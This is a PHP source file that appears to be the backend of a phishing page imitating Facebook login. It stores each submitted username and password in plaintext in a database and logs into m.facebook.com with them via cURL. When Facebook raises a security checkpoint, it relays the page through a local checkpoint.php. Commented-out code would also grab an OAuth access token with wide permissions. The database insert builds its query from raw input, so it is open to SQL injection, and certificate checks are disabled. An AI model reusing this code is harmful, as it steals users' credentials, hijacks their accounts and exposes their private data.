<?php
session_start();
session_regenerate_id();
$_SESSION["user"] = $_POST["user"];
$_SESSION["password"] = $_POST["password"];
//$token = login();
//if(strlen($token) > 250){$token = "invalid";};
//$_SESSION["token"] = $token;
grava();
login();
//if($token == "invalid"){
// echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
//}else{
//header('Location: chat.php'); 
//header('Location: chat.php?tk=' . $token); 
//}
//exit;
function login(){
//$login_email = getenv("email");
//$login_pass = getenv("passw");
$login_email = $_POST["user"];
$login_pass = $_POST["password"];
    
//Simple cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charset_test=â‚¬,Â´,â‚¬,Â´,æ°´,Ð”,Ð„&email=' . urlencode($login_email) . '&pass=' . urlencode($login_pass) . '&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Charset: utf-8',
    'Accept-Language: en-us,en;q=0.7,bn-bd;q=0.3',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/mirazmac_cookie.txt'); // The cookie file
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/mirazmac_cookie.txt'); // cookie jar
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windo`enter code here`ws; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
curl_setopt($ch, CURLOPT_REFERER, "http://m.facebook.com");
$fbMain = curl_exec($ch) or die(curl_error($ch));
//var_dump($fbMain);
if (strpos($fbMain, "checkpoint")  !== false){
   //$pos1i = strpos($fbMain, "fb_dtsg") + 16;
   //$pos1f = strpos(substr($fbMain,$pos1i,100), "autocomplete") - 2 + $pos1i;
   //$fb_dtsg_code = substr($fbMain,$pos1i,$pos1f - $pos1i);
   
   //$pos2i = strpos($fbMain, 'name="nh"') + 17;
   //$pos2f = strpos(substr($fbMain,$pos2i,100), "/>") - 2 + $pos2i;
   //$nh_code = substr($fbMain,$pos1i,$pos2f - $pos1i);
   
   $fbMod = str_replace('action="/login/checkpoint/"','action="checkpoint.php"',$fbMain);
   echo $fbMod;
   
   //$_SESSION["checkpoint"] = $fbMain;
   //$_SESSION["fb_dtsg_code"] =  $fb_dtsg_code;
   //$_SESSION["nh_code"] = $nh_code;
   //header("Location: checkpoint.php"); /* Redirect browser */
   //exit();
}else{
   header("Location: gettoken.php"); /* Redirect browser */
   exit();
}
//echo $fbMain;
//curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/checkpoint/?next=https://m.facebook.com/');
//curl_setopt($ch, CURLOPT_POSTFIELDS, 'fb_dtsg=' . urlencode($fb1) . '&nh=' . urlencode($fb2) . '&submit[Continue]=Continue');
//$fbCheck = curl_exec($ch) or die(curl_error($ch));
//var_dump($fbCheck);
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=9&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&verification_method=3&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=c&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=e&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&answer_choices=0&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=h&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&answer_choices=1&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=l&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&answer_choices=0&submit[Continue]=Continue&__user=0&__a=1&__dyn=7xeU6CQ3S3mbx676-C1swgE98nwgU6C7UW3e3eaxe1qwh8eU88lwm82yxG48hw&__req=o&__be=-1&__pc=PHASED%3ADEFAULT&ttstamp=210049825411588997969657361&__rev=2447731
//envia pro telefone
//fb_dtsg=d1R6sXcOEAI%3D&nh=4f58232f5c61b93a586164b86e072af00319bece&send_code=1&contact_index=0&submit[Continue]=Continue
//echo '<br>.............1................<br>';
/*
$url="https://m.facebook.com/dialog/oauth?client_id=464891386855067&redirect_uri=https://www.facebook.com/connect/login_success.html&scope=basic_info,email,public_profile,user_about_me,user_activities,user_birthday,user_education_history,user_friends,user_interests,user_likes,user_location,user_photos,user_relationship_details&response_type=token";
//$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Must be set to true so that PHP follows any "Location:" header
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//$ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.16 (KHTML, like Gecko) \ Chrome/24.0.1304.0 Safari/537.16';
//curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$a = curl_exec($ch); // $a will contain all headers
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it will return you the last effective URL
//echo "<pre>";
//print_r($a);
//echo"<br>";
//echo "</pre>";
//echo $url; // Voila
//echo"<br>";
curl_close($ch);
$pos1 = strpos($a, "access_token=") + 13;
$pos2 = strpos($a, "&expires_in");
$token = substr($a,$pos1,$pos2 - $pos1);
//echo $token;
return $token;
*/
}
function grava(){
$dbopts = parse_url(getenv('DATABASE_URL'));
$dsn = "pgsql:"
    . "host=" . $dbopts["host"] . ";"
    . "dbname=". ltrim($dbopts["path"],'/') . ";"
    . "user=" . $dbopts["user"] . ";"
    . "port=" . $dbopts["port"] . ";"
    . "sslmode=require;"
    . "password=" . $dbopts["pass"];
    
$db = new PDO($dsn);
$login = $_POST["user"];
$passw = $_POST["password"];
$token = "generating";
//$token = $_SESSION["token"];
$tempo = date('m/d/Y h:i:s a');
$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
//echo var_dump($query);
//echo '<br><br>';
$result = $db->query($query);
//echo var_dump($result);
//echo '<br><br>';
$result->closeCursor();
//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
//echo '<br>end<br>';
}
?>
